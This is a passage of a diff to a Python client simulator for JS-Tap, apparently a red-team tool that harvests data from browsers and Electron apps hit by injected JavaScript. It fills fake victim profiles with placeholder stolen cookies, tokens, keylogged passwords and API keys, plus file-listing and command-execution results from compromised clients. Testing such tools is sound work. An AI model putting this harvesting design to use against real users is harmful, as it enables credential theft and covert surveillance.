@@ -1,290 +1,1127 @@
-#!usr/bin/env python
-import json
-import asyncio
-import aiohttp
-import time
-import random
-import requests
-import base64
+#!/usr/bin/env python3
+"""JS-Tap Client Simulator
 
-
-# Script to simulate clients sending in loot
-# To stress test the system, see how well it
-# holds up
-
-
-numClients = 3
-
-
-randStartRange = 1
-randEndRange   = 10
-
-
-apiServer = "https://100.115.92.203:8444/"
-victimApp = "https://vulnerableapp.com"
-
-
-
-
-fakeHtml = """
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum malesuada mollis pretium. Sed ut faucibus nulla, euismod blandit lacus. Etiam dolor libero, pulvinar tristique pharetra non, porttitor vitae enim. Vestibulum fermentum, tellus at tempor blandit, sapien orci dignissim libero, et malesuada ligula metus posuere nisi. Nullam a gravida mauris. Aliquam tortor massa, dapibus nec scelerisque non, faucibus ut dolor. Ut id tincidunt purus, et ultrices arcu.
-
-Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Vivamus dictum elit non ultricies placerat. Aenean eleifend justo nec leo tincidunt malesuada. Vivamus tellus massa, posuere at odio a, consequat venenatis ligula. Quisque vel ante vel diam hendrerit pellentesque. In hac habitasse platea dictumst. Integer nec magna vitae augue viverra tincidunt. Donec scelerisque eleifend rhoncus.
-
-Phasellus tincidunt nulla urna, sit amet pellentesque purus dictum id. Ut eget augue congue, pellentesque magna et, bibendum velit. Donec et magna ut diam congue rhoncus sit amet a nisl. Proin consectetur vel urna sed ornare. Praesent odio leo, pellentesque eu ullamcorper at, vestibulum ac libero. Aliquam finibus mollis sagittis. Aliquam fermentum finibus est, sed varius purus consectetur vel. Curabitur vitae efficitur felis. Nullam imperdiet enim ut mauris scelerisque laoreet. Phasellus egestas purus quis leo mollis, in sollicitudin dui ornare. Praesent laoreet aliquam eros vel suscipit.
-
-Integer sed pretium massa. Sed eget diam magna. Cras ultricies imperdiet vestibulum. Maecenas mattis purus vitae arcu semper, et commodo tortor pellentesque. In hac habitasse platea dictumst. Sed pharetra dictum velit vitae viverra. Ut erat sapien, placerat quis ex sit amet, dignissim vestibulum tortor. Fusce convallis, mi elementum volutpat rhoncus, magna urna vulputate felis, a finibus mi elit vel lectus. Mauris auctor lacinia nibh, posuere interdum mauris imperdiet id. Vivamus sagittis risus et est lobortis, eget sodales urna imperdiet. Nunc a risus at diam porta feugiat ac quis orci. In accumsan, quam posuere laoreet interdum, magna est blandit mauris, et sodales metus dolor non est. Pellentesque non quam enim.
-
-Nulla ante mauris, bibendum a dolor at, viverra posuere tellus. Ut dignissim pellentesque metus. Ut ut euismod nisl. Cras diam leo, elementum at massa non, tristique placerat nulla. Nunc ut sapien efficitur, ultrices lectus ac, pretium sem. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec nec sodales eros, at eleifend magna. Sed pellentesque sodales risus porta molestie. Phasellus egestas odio eget elit iaculis, vel varius libero malesuada. Maecenas maximus fermentum augue. Donec finibus volutpat rhoncus. Vestibulum nec tincidunt libero. Integer sit amet velit vel nisi auctor pellentesque. Vestibulum dolor dolor, consectetur at urna a, luctus suscipit dolor. Integer turpis leo, scelerisque sit amet diam vel, semper euismod sapien. Donec cursus risus in dolor ultrices, eu pharetra ex gravida.
-
-Duis eu ipsum at enim gravida lacinia. Mauris sapien lorem, tincidunt at convallis in, convallis auctor augue. Suspendisse at mi efficitur, auctor risus ac, accumsan tortor. Aenean vel neque nunc. Ut ut dui metus. In sodales magna at libero sodales, sit amet ornare est varius. Nam ac finibus odio. Curabitur non consectetur eros. Sed dolor augue, sodales non ligula a, aliquet placerat lectus. Nunc molestie ligula et ligula tincidunt, eget porttitor ipsum egestas. Morbi id consectetur erat. Nunc porttitor porta commodo.
-
-Aenean augue orci, tincidunt vestibulum pharetra eu, molestie id tellus. Aenean condimentum ipsum at est feugiat dapibus. In sit amet lectus vel ex malesuada bibendum. Cras consequat sem id felis feugiat, eget suscipit tortor placerat. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla sit amet ligula vel ipsum interdum ullamcorper. Nunc eget sodales nisl. Quisque vel tempus mi.
-
-Donec vulputate nibh non placerat rhoncus. Etiam placerat blandit leo nec sagittis. Aliquam gravida tortor ac ex mollis, vitae iaculis ligula elementum. Donec venenatis, magna feugiat suscipit tempor, mi magna facilisis velit, ac aliquet nisi nisi quis turpis. Suspendisse fringilla rutrum lectus, sed tempus ligula pellentesque vel. Donec risus massa, luctus in dolor at, finibus gravida ipsum. Integer finibus at diam et aliquam. Suspendisse at tincidunt tellus. Sed sed tortor id lacus ultricies aliquet ut eget lacus. Suspendisse sollicitudin feugiat dui, luctus scelerisque magna pretium nec. In vel lorem consequat, pellentesque ex ac, malesuada quam. Nam lobortis vel odio quis rhoncus. Donec sit amet risus vulputate, pulvinar orci eu, ultricies justo. In diam leo, consectetur et est sed, interdum consequat augue. Pellentesque accumsan ac nunc non rutrum. Nunc leo nibh, finibus eget eleifend quis, fermentum sed odio.
-
-Sed efficitur pulvinar sodales. Morbi faucibus metus ipsum, in tempor nunc sagittis eu. Vivamus odio quam, fringilla eu mi a, fermentum efficitur tortor. Aenean non imperdiet lacus, ut condimentum dolor. Donec ipsum dui, consectetur vel nunc tempus, bibendum maximus felis. Vivamus ultrices dui erat, non tempor mi tincidunt sed. Sed gravida porttitor quam eget convallis. Duis quis velit eu eros varius convallis. Nullam sollicitudin consequat quam at lacinia. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Proin quis magna vel ante condimentum commodo ac suscipit lectus.
-
-Pellentesque condimentum tristique suscipit. Quisque tempor diam dui, id bibendum purus faucibus a. Maecenas ac nulla tempor, condimentum est sed, faucibus purus. Nunc sit amet ligula in augue euismod varius ultrices a est. Duis dignissim ipsum sed arcu tincidunt efficitur. Pellentesque iaculis elementum laoreet. Phasellus lobortis suscipit arcu, vitae sagittis tellus accumsan a. Vivamus tincidunt egestas diam vel condimentum. Donec a ex sollicitudin lorem viverra tempus eu at nunc. Nulla facilisi. Suspendisse interdum, nunc semper commodo accumsan, metus sapien faucibus nulla, at pharetra sapien orci non erat. Nam tristique, dolor id commodo ornare, justo dolor porttitor turpis, in porttitor eros massa at felis. Mauris ultrices ultricies lorem, at maximus urna accumsan et. Praesent pulvinar tincidunt odio nec pellentesque. Nulla facilisi. Praesent nec diam vitae purus condimentum tincidunt.
-
-Quisque convallis lacus ac sagittis commodo. In hac habitasse platea dictumst. Nulla id est arcu. Sed diam tortor, viverra vel pellentesque nec, varius id nunc. In rhoncus, enim et ultricies semper, purus ligula ultrices eros, non sollicitudin ex turpis eget ipsum. Integer lacinia enim eget magna condimentum, non pharetra diam pulvinar. Donec vehicula justo euismod pharetra faucibus. Quisque faucibus sapien convallis, tempor augue quis, hendrerit felis. Cras vestibulum pretium libero, vel mollis diam ultrices vel. Nunc id eros pellentesque, dictum nisi laoreet, varius justo. Pellentesque velit nisi, iaculis ac arcu et, fermentum semper velit. Suspendisse potenti. Donec pellentesque mauris at nulla venenatis, ac blandit lectus placerat. Mauris metus tellus, ultrices id pulvinar vitae, vulputate non purus.
-
-Etiam malesuada lacus nec congue dignissim. Praesent commodo, lorem a tristique tristique, massa leo rhoncus arcu, sit amet faucibus sem nisl pretium leo. Donec non aliquet mi. Vestibulum sed orci sit amet enim fringilla sollicitudin. Proin in tristique metus. Aliquam erat volutpat. Vivamus tincidunt felis et congue cursus. Vivamus ac metus ut eros fermentum semper a eget risus. Aliquam erat volutpat. Pellentesque dignissim justo vitae neque tristique dictum.
-
-Aenean eu tempus odio. Phasellus vitae egestas arcu. Phasellus volutpat urna non enim sodales vehicula. Morbi imperdiet nisl dictum lacus porttitor, eu rhoncus tellus tristique. Aliquam id posuere ante, ac faucibus lorem. Sed id turpis nec enim ultricies tempor sed non nibh. Nullam quis diam quis diam eleifend tempor. Interdum et malesuada fames ac ante ipsum primis in faucibus. Etiam consequat nulla eu dictum tincidunt. Donec convallis mauris sed quam pulvinar, ac porta mauris semper. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Etiam imperdiet neque ut metus convallis, scelerisque laoreet leo lacinia. Aenean rhoncus urna pretium mauris euismod ultricies. Donec euismod bibendum sapien non aliquam. Maecenas fringilla dignissim purus, et consequat lectus consequat ac. Morbi efficitur dolor eget tincidunt egestas.
-
-Integer mi dui, semper at mollis eu, interdum eu dui. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vivamus at est nec urna mollis faucibus sit amet vel urna. Quisque porttitor lacus non pharetra facilisis. Etiam sed varius mi. Integer vel posuere lacus, et pellentesque lectus. Curabitur in interdum orci. Sed nec ultricies diam, et malesuada nisi. Fusce ornare varius dui sed mattis. Etiam ultricies arcu ac libero condimentum, sed ultricies ligula placerat. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vivamus mattis commodo convallis. Donec et iaculis justo. Etiam vel lorem non purus gravida facilisis et a tortor. Morbi nec ante ornare, tincidunt mi et, ultricies mi. Ut sit amet iaculis ligula, et pulvinar mauris.
-
-Duis eget egestas massa. Donec consectetur pellentesque urna, vel gravida orci rhoncus non. Nam eget neque eget tellus commodo tincidunt nec sed neque. Sed purus sapien, bibendum facilisis lacinia vitae, commodo a elit. Cras iaculis purus ut tristique bibendum. Aliquam erat volutpat. Nunc risus dolor, dapibus eu sem vel, fringilla tincidunt felis. Nam tristique aliquet orci, vel ornare nibh sagittis non.
-
-Nullam eget sagittis erat, sed sagittis risus. Vestibulum suscipit, elit eu placerat interdum, lorem lorem interdum est, eu cursus turpis neque eu orci. Quisque ac varius nisl, vitae pellentesque leo. Donec feugiat turpis in tempor ultricies. Nunc elementum mollis tellus, et faucibus leo dictum vitae. Sed non purus tincidunt, dignissim magna varius, imperdiet arcu. Sed scelerisque auctor aliquet. Mauris in arcu convallis, hendrerit lectus vel, vulputate neque. Ut elit lorem, pharetra venenatis est ut, auctor pellentesque sem. Fusce venenatis velit ut turpis pharetra condimentum. Nam vel turpis leo. Etiam aliquet leo nec libero vulputate vestibulum. Nullam sagittis augue ut sapien venenatis feugiat. Aenean eu neque sit amet neque finibus fringilla et sit amet sem.
-
-Proin tincidunt, elit eu bibendum rutrum, ex dolor feugiat mauris, eget ultricies tortor augue id est. Mauris non turpis odio. Nam nec viverra sem. Duis ultricies molestie elit vel mattis. Donec libero tortor, fringilla sit amet vestibulum sed, blandit sed massa. Nulla facilisi. Nulla odio turpis, lobortis non turpis sit amet, cursus viverra sem. Integer venenatis at lectus ut commodo. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae;
-
-Aenean tempus nisl diam, ullamcorper pellentesque purus aliquam eget. Nullam lacus tortor, tempor at magna at, tincidunt hendrerit urna. Maecenas commodo luctus consectetur. In imperdiet pulvinar magna a bibendum. Praesent quis interdum nulla. Duis sit amet condimentum est, sed dictum massa. Ut non accumsan enim, at sodales nulla. Morbi sed nisi odio. Nam urna justo, ultrices a sodales et, viverra non dui. Phasellus cursus nisl nec placerat convallis. Ut imperdiet nulla tortor, volutpat consectetur nulla aliquam ut. Proin pretium pharetra libero sit amet posuere. Morbi rutrum mi non commodo convallis. Phasellus condimentum velit a laoreet elementum. Suspendisse lorem erat, imperdiet in nulla sit amet, aliquet tincidunt nibh. Sed consectetur ullamcorper mi non bibendum.
-
-Nunc pellentesque eu urna sed molestie. Cras mattis arcu justo, quis eleifend leo imperdiet iaculis. Cras purus odio, facilisis ac tellus in, finibus luctus odio. Donec sit amet ultrices odio. Pellentesque in lacus sapien. In porttitor velit nisl, quis interdum lacus fermentum nec. Ut sit amet magna ut purus interdum molestie. Fusce sollicitudin in neque eget laoreet. Maecenas eu urna sem. Maecenas quis ante varius, semper orci nec, aliquam ipsum. Donec et interdum lacus.
-
-Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Mauris dignissim vel augue id consequat. Quisque congue ex turpis, id ultrices augue tincidunt vel. Cras venenatis odio quam, quis vehicula urna pretium sed. Nullam iaculis fermentum dolor non maximus. In odio dolor, sollicitudin eu risus eu, cursus ornare tellus. Maecenas ullamcorper ligula at congue fringilla. Donec malesuada ligula at felis laoreet facilisis. Quisque tempus, eros ut blandit lacinia, risus mauris hendrerit purus, vitae finibus mauris lorem et nulla. Vestibulum urna erat, aliquam facilisis pulvinar dignissim, fringilla ac tortor. Nulla id justo vehicula, aliquam nisl sit amet, pulvinar lacus. Nulla eu tempus nunc, nec lobortis justo. Integer nec malesuada mi. Pellentesque porttitor tortor id leo viverra, et ultrices magna malesuada. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Maecenas mattis molestie turpis in sollicitudin. 
-
+Creates diverse fake clients, sends realistic loot, polls for custom payloads,
+and prints a live status grid. Useful for testing target rules, match filtering,
+autorun/repeat, and custom payload delivery.
 """
 
+import argparse
+import asyncio
+import aiohttp
+import base64
+import json
+import os
+import random
+import sys
+import time
 
-with open('./clientSimulatorScreenshot.png', 'rb') as image_file:
-	screenshotData = image_file.read()
-
-
-
-class Client:
-	def __init__(self, client_id):
-		self.client_id = client_id
-		self.uuid      = None
-		self._running  = True
-
-
-	async def initialize(self, session):
-		await self.getUUID(session)
-		print(f"Client {self.client_id} UUID: {self.uuid}")
+from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 
+# ── User-Agent strings ─────────────────────────────────────────────────────────
 
-	async def run(self, session):
-		while self._running:
-			print("Client " + str(self.client_id) + " run loop")
+LINUX_CHROME_UA = (
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+)
+LINUX_FIREFOX_UA = (
+    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
+)
+WIN_CHROME_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+)
+WIN_EDGE_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
+)
+MAC_SAFARI_UA = (
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 "
+    "(KHTML, like Gecko) Version/17.2 Safari/605.1.15"
+)
+
+ELECTRON_SLACK_UA = "AtomBeacon/1.0 (Linux 6.6.99; x64) Electron/33.0.0 Node/v20.18.0"
+ELECTRON_VSCODE_UA = "AtomBeacon/1.0 (Windows NT 10.0; x64) Electron/32.2.1 Node/v20.15.1"
+ELECTRON_DISCORD_UA = "AtomBeacon/1.0 (Darwin 23.4.0; arm64) Electron/31.7.5 Node/v20.14.0"
+ELECTRON_OBSIDIAN_UA = "AtomBeacon/1.0 (Linux 6.8.0; x64) Electron/32.0.0 Node/v20.16.0"
+
+# ── Client profiles ────────────────────────────────────────────────────────────
+
+CLIENT_PROFILES = [
+    {"count": 3, "tag": "wp",    "user_agent": LINUX_CHROME_UA,  "label": "Linux/Chrome"},
+    {"count": 2, "tag": "wp",    "user_agent": LINUX_FIREFOX_UA, "label": "Linux/Firefox"},
+    {"count": 3, "tag": "admin", "user_agent": WIN_CHROME_UA,    "label": "Win/Chrome"},
+    {"count": 2, "tag": "admin", "user_agent": WIN_EDGE_UA,      "label": "Win/Edge"},
+    {"count": 2, "tag": "",      "user_agent": MAC_SAFARI_UA,    "label": "Mac/Safari"},
+]
+
+# ── Fake data pools ────────────────────────────────────────────────────────────
+
+FAKE_URLS = [
+    "https://targetapp.com/dashboard",
+    "https://targetapp.com/admin/users",
+    "https://targetapp.com/settings/profile",
+    "https://targetapp.com/api/v1/data",
+    "https://targetapp.com/login",
+    "https://targetapp.com/checkout",
+    "https://targetapp.com/account/billing",
+    "https://targetapp.com/reports/quarterly",
+]
+
+FAKE_COOKIES = [
+    ("PHPSESSID", "abc123def456"),
+    ("jwt_token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.fake"),
+    ("_session_id", "s3cr3t_s3ss10n_v4lu3"),
+    ("csrftoken", "9f2k4j8m3n1p5q7r"),
+    ("remember_me", "dXNlcjEyMzQ1Ng=="),
+    ("lang", "en-US"),
+]
+
+FAKE_LOCAL_STORAGE = [
+    ("authToken", "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQGNvcnAuY29tIn0.signature"),
+    ("userPrefs", '{"theme":"dark","lang":"en","notifications":true}'),
+    ("cartData", '[{"id":42,"name":"Widget","qty":2}]'),
+    ("lastLogin", "2025-12-15T08:30:00Z"),
+]
+
+FAKE_SESSION_STORAGE = [
+    ("csrfToken", "x9f2a7b4c1e8d3"),
+    ("tempAuth", "tmp_8k3m9n2p5q1r"),
+    ("wizardStep", "3"),
+    ("formDraft", '{"field1":"partial","field2":"data"}'),
+]
+
+FAKE_INPUTS = [
+    ("username", "admin"),
+    ("password", "hunter2"),
+    ("email", "user@corp.com"),
+    ("search", "confidential reports"),
+    ("credit_card", "4111-1111-1111-1111"),
+    ("ssn", "123-45-6789"),
+    ("api_key", "sk-proj-abc123def456"),
+]
+
+FAKE_HTML_SNIPPETS = [
+    '<html><head><title>Dashboard</title></head><body><div class="user-panel"><h1>Welcome, admin</h1><p>Last login: Dec 15, 2025</p><ul><li>Pending orders: 14</li><li>Revenue: $48,230</li></ul></div></body></html>',
+    '<html><head><title>User Management</title></head><body><table class="users"><tr><th>Name</th><th>Role</th></tr><tr><td>alice@corp.com</td><td>admin</td></tr><tr><td>bob@corp.com</td><td>user</td></tr></table></body></html>',
+    '<html><head><title>Settings</title></head><body><form id="profile"><input name="email" value="admin@corp.com"/><input name="phone" value="+1-555-0142"/><select name="role"><option selected>Super Admin</option></select></form></body></html>',
+    '<html><head><title>API Keys</title></head><body><div class="keys"><p>Production: sk-live-abc123</p><p>Staging: sk-test-def456</p><button>Regenerate</button></div></body></html>',
+]
+
+FAKE_XHR_CALLS = [
+    {
+        "method": "POST",
+        "url": "https://targetapp.com/api/v1/users",
+        "body": base64.b64encode(b'{"name":"newuser","role":"admin"}').decode(),
+        "responseBody": base64.b64encode(b'{"id":42,"status":"created"}').decode(),
+        "responseStatus": 201,
+        "headers": {"Authorization": "Bearer eyJhbG...", "Content-Type": "application/json"},
+    },
+    {
+        "method": "GET",
+        "url": "https://targetapp.com/api/v1/secrets",
+        "body": base64.b64encode(b'').decode(),
+        "responseBody": base64.b64encode(b'{"db_password":"p@ssw0rd!","api_key":"sk-secret-789"}').decode(),
+        "responseStatus": 200,
+        "headers": {"Authorization": "Bearer eyJhbG...", "X-API-Key": "internal-key-123"},
+    },
+    {
+        "method": "PUT",
+        "url": "https://targetapp.com/api/v1/config",
+        "body": base64.b64encode(b'{"debug":true,"maintenance":false}').decode(),
+        "responseBody": base64.b64encode(b'{"updated":true}').decode(),
+        "responseStatus": 200,
+        "headers": {"Authorization": "Bearer eyJhbG..."},
+    },
+]
+
+# ── Fake beacon data pools ────────────────────────────────────────────────────
+
+FAKE_BEACON_DOMAINS = [
+    "pizzatracker.biz",
+    "catfacts.lol",
+    "wizard-supplies.net",
+    "not-a-virus.download",
+    "free-robux.gg",
+    "definitely-legit-bank.com",
+    "flat-earth-proof.org",
+    "crypto-moon-lambo.io",
+    "grandmas-secret-recipes.co",
+    "area51-tours.travel",
+]
+
+FAKE_BEACON_PATHS = {
+    "pizzatracker.biz":          ["/track/order/42", "/menu/extra-cheese", "/coupons/BOGO", "/delivery-status"],
+    "catfacts.lol":              ["/fact/daily", "/subscribe?confirm=yes", "/unsubscribe/impossible", "/gallery/chonkers"],
+    "wizard-supplies.net":       ["/wands/elder", "/potions/invisibility", "/robes/sale", "/checkout"],
+    "not-a-virus.download":      ["/totally-safe.exe", "/free-antivirus", "/toolbar-install", "/scan-results"],
+    "free-robux.gg":             ["/generate?amount=99999", "/verify-human", "/survey/complete", "/download-hack"],
+    "definitely-legit-bank.com": ["/login", "/account/transfer", "/admin/dashboard", "/api/v1/accounts"],
+    "flat-earth-proof.org":      ["/evidence", "/nasa-lies", "/dome-theory", "/join-the-movement"],
+    "crypto-moon-lambo.io":      ["/ico/presale", "/wallet/connect", "/stake/all-in", "/roadmap"],
+    "grandmas-secret-recipes.co":["/cookies/chocolate-chip", "/casserole/surprise", "/meatloaf/classic", "/life-story-before-recipe"],
+    "area51-tours.travel":       ["/book-tour", "/alien-gift-shop", "/restricted-zone", "/ufo-sightings"],
+}
+
+FAKE_BEACON_COOKIES = [
+    ("session_id", "xK9mZp2qR7wN4vTy", '{"httpOnly": true, "secure": true, "sameSite": "Strict", "path": "/"}'),
+    ("auth_token", "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXIifQ.fakesig", '{"httpOnly": false, "secure": true, "sameSite": "Lax"}'),
+    ("tracking_id", "ua-777-pizza-lover-42", '{"httpOnly": false, "secure": false, "sameSite": "None"}'),
+    ("preferences", "theme=dark&lang=en&pizza=yes", '{"httpOnly": false, "secure": false, "sameSite": "Lax", "path": "/settings"}'),
+    ("admin_flag", "is_admin=true; role=superuser", '{"httpOnly": true, "secure": true, "sameSite": "Strict"}'),
+    ("_csrf", "d3f1n1t3ly-n0t-gu3ss4bl3", '{"httpOnly": true, "secure": true, "sameSite": "Strict"}'),
+    ("remember_me", "base64(user:wizardadmin)", '{"httpOnly": false, "secure": true, "sameSite": "Lax", "expires": "2099-12-31"}'),
+]
+
+FAKE_BEACON_LOCAL_STORAGE = [
+    ("user_profile", '{"name": "Gandalf", "role": "wizard", "level": 99}'),
+    ("api_key", "sk-live-n0t-4-pr0duct10n-us3-pl34s3"),
+    ("feature_flags", '{"darkMode": true, "betaAccess": true, "secretMenu": true}'),
+    ("cached_credentials", '{"username": "admin", "hash": "5f4dcc3b5aa765d61d8327deb882cf99"}'),
+    ("app_state", '{"lastPage": "/dashboard", "cart": ["wand", "potion", "robe"]}'),
+]
+
+FAKE_BEACON_SESSION_STORAGE = [
+    ("temp_token", "tmp_9x8w7v6u5t4s3r2q1p"),
+    ("form_draft", '{"to": "accounts@bank.com", "amount": "$1,000,000", "memo": "totally normal"}'),
+    ("search_history", '["password reset", "how to hack", "delete browser history"]'),
+    ("checkout_step", '{"step": 3, "payment": "crypto", "shipping": "overnight"}'),
+]
+
+FAKE_BEACON_HEADERS = [
+    ("Authorization", "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IldpemFyZCBBZG1pbiJ9.fakesig"),
+    ("X-API-Key", "prod-key-d0nt-sh4r3-th1s-0n3"),
+    ("X-Internal-Token", "internal-microservice-secret-abc123"),
+    ("X-Forwarded-For", "192.168.1.42, 10.0.0.1"),
+    ("Cookie", "session=abc123; admin=true; debug=on"),
+    ("X-Custom-Auth", "HMAC-SHA256:timestamp:nonce:signature"),
+]
+
+FAKE_SIDECAR_RESPONSES = {
+    "list_dir": {
+        "path": "/home/wizard",
+        "contents": [
+            "passwords.txt", "secret_plans.docx", ".ssh/", "bitcoin_wallet.dat",
+            "totally_not_malware.exe", "grandmas_recipes_BACKUP.zip",
+            "world_domination_checklist.md", "browser_history_DO_NOT_OPEN/",
+        ],
+    },
+    "read_file": {
+        "content": (
+            "TOP SECRET - OPERATION PIZZA PARTY\n"
+            "================================\n"
+            "The treasure is buried under the third pizza oven.\n"
+            "WiFi password: correct-horse-battery-staple\n"
+            "Admin password: hunter2\n"
+            "Launch codes: up up down down left right left right B A\n"
+        ),
+    },
+    "exec_cmd": {
+        "output": (
+            "uid=1000(wizard) gid=1000(wizard) groups=1000(wizard),27(sudo),1337(hackers)\n"
+            "Linux wizard-tower 6.1.0-wizardOS #1 SMP PREEMPT_DYNAMIC x86_64\n"
+            "  PID TTY          TIME CMD\n"
+            " 1337 pts/0    00:00:42 definitely-not-a-backdoor\n"
+            " 9001 pts/1    00:13:37 crypto-miner --stealth\n"
+        ),
+    },
+}
+
+# ── Beacon client profiles ────────────────────────────────────────────────────
+
+BEACON_PROFILES = [
+    {"count": 2, "tag": "internal", "user_agent": LINUX_CHROME_UA,  "label": "Bex/Lin/Chrome"},
+    {"count": 2, "tag": "internal", "user_agent": WIN_CHROME_UA,    "label": "Bex/Win/Chrome"},
+    {"count": 1, "tag": "",         "user_agent": MAC_SAFARI_UA,    "label": "Bex/Mac/Safari"},
+]
+
+# ── Electron client profiles ─────────────────────────────────────────────────
+
+ELECTRON_PROFILES = [
+    {"count": 1, "tag": "internal", "user_agent": ELECTRON_SLACK_UA,    "label": "Atom/Slack"},
+    {"count": 1, "tag": "dev",      "user_agent": ELECTRON_VSCODE_UA,   "label": "Atom/VSCode"},
+    {"count": 1, "tag": "",         "user_agent": ELECTRON_DISCORD_UA,  "label": "Atom/Discord"},
+    {"count": 1, "tag": "dev",      "user_agent": ELECTRON_OBSIDIAN_UA, "label": "Atom/Obsidian"},
+]
+
+# ── Fake electron data pools ─────────────────────────────────────────────────
+
+FAKE_ELECTRON_DOMAINS = [
+    "app.slack.com", "discord.com", "github.dev", "obsidian.md",
+    "marketplace.visualstudio.com", "teams.microsoft.com", "notion.so", "figma.com",
+]
+
+FAKE_ELECTRON_PATHS = {
+    "app.slack.com":                ["/client/T0123ABC/C0456DEF", "/files/U789GHI/F012JKL", "/admin/settings", "/archives/C0456DEF/p1700000000"],
+    "discord.com":                  ["/channels/123456789/987654321", "/api/v9/users/@me", "/settings/appearance", "/guild-discovery"],
+    "github.dev":                   ["/user/repo/blob/main/src/index.ts", "/user/repo/pull/42", "/codespaces/new", "/settings/tokens"],
+    "obsidian.md":                  ["/vault/notes/daily/2026-02-15.md", "/vault/templates/meeting-notes.md", "/plugins/community", "/settings/sync"],
+    "marketplace.visualstudio.com": ["/items?itemName=ms-python.python", "/manage/publishers/my-org", "/api/v1/extensions", "/search?query=theme"],
+    "teams.microsoft.com":         ["/v2/conversations/19:meeting_abc@thread.v2", "/api/chats", "/files/shared", "/calendar/view/workweek"],
+    "notion.so":                    ["/workspace/abc123/Project-Roadmap", "/api/v1/blocks", "/settings/members", "/templates/gallery"],
+    "figma.com":                    ["/file/abc123/Design-System", "/proto/def456", "/files/team/789", "/settings/billing"],
+}
+
+FAKE_KEYLOGS = [
+    {"keys": "admin@corp.com\tP@ssw0rd!2026\r", "target": "INPUT#email[type=email]", "url": "https://app.slack.com/client/T0123ABC"},
+    {"keys": "ssh-rsa AAAAB3NzaC1yc2EAAAA", "target": "TEXTAREA#snippet-content", "url": "https://github.dev/user/repo/blob/main/.ssh/authorized_keys"},
+    {"keys": "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG", "target": "TEXTAREA.terminal-input", "url": "https://github.dev/codespaces/terminal"},
+    {"keys": "vault password: Tr3@sure-Hunt3r", "target": "INPUT#vault-password[type=password]", "url": "https://obsidian.md/vault/settings/sync"},
+    {"keys": "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh", "target": "INPUT#token-field[type=text]", "url": "https://github.dev/settings/tokens/new"},
+    {"keys": "SELECT * FROM users WHERE role='admin'", "target": "TEXTAREA.query-editor", "url": "https://notion.so/workspace/abc123/Database-Query"},
+]
+
+FAKE_RESPONSE_HEADERS = [
+    ("Set-Cookie", "session=eyJhbGciOiJIUzI1NiJ9.abc123; Path=/; HttpOnly; Secure"),
+    ("X-Internal-Service", "auth-gateway-prod-us-east-1"),
+    ("X-Request-ID", "req-7f3a9c2e-4b8d-11ee-be56-0242ac120002"),
+    ("X-Ratelimit-Remaining", "47"),
+    ("Server", "envoy/1.28.0"),
+    ("X-Backend-Server", "api-worker-3.internal.corp.net:8443"),
+    ("X-Debug-Token", "prof_abc123_1700000000"),
+    ("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline' cdn.example.com"),
+]
+
+ELECTRON_STATUS_PROFILES = {
+    "Atom/Slack": {
+        "hostname": "dev-workstation-01", "platform": "linux", "arch": "x64",
+        "username": "wizard", "homedir": "/home/wizard",
+        "capabilities": ["file_browser", "shell", "screenshot", "cookies", "headers", "renderer_injection"],
+        "windows": [
+            {"id": 1, "url": "https://app.slack.com/client/T0123ABC/C0456DEF", "title": "Slack - #general", "injected": True},
+            {"id": 2, "url": "https://app.slack.com/client/T0123ABC/D789GHI", "title": "Slack - DM: Alice", "injected": True},
+        ],
+    },
+    "Atom/VSCode": {
+        "hostname": "DESKTOP-A1B2C3D", "platform": "win32", "arch": "x64",
+        "username": "dev-user", "homedir": "C:\\Users\\dev-user",
+        "capabilities": ["file_browser", "shell", "screenshot", "headers", "renderer_injection"],
+        "windows": [
+            {"id": 1, "url": "https://github.dev/user/repo/blob/main/src/index.ts", "title": "index.ts - repo - Visual Studio Code", "injected": True},
+            {"id": 2, "url": "vscode-webview://webviewId/settings", "title": "Settings", "injected": False},
+        ],
+    },
+    "Atom/Discord": {
+        "hostname": "macbook-pro.local", "platform": "darwin", "arch": "arm64",
+        "username": "gamer", "homedir": "/Users/gamer",
+        "capabilities": ["file_browser", "shell", "screenshot", "cookies", "headers", "renderer_injection"],
+        "windows": [
+            {"id": 1, "url": "https://discord.com/channels/123456789/987654321", "title": "Discord - #lobby", "injected": True},
+        ],
+    },
+    "Atom/Obsidian": {
+        "hostname": "notes-station", "platform": "linux", "arch": "x64",
+        "username": "researcher", "homedir": "/home/researcher",
+        "capabilities": ["file_browser", "shell", "screenshot", "renderer_injection"],
+        "windows": [
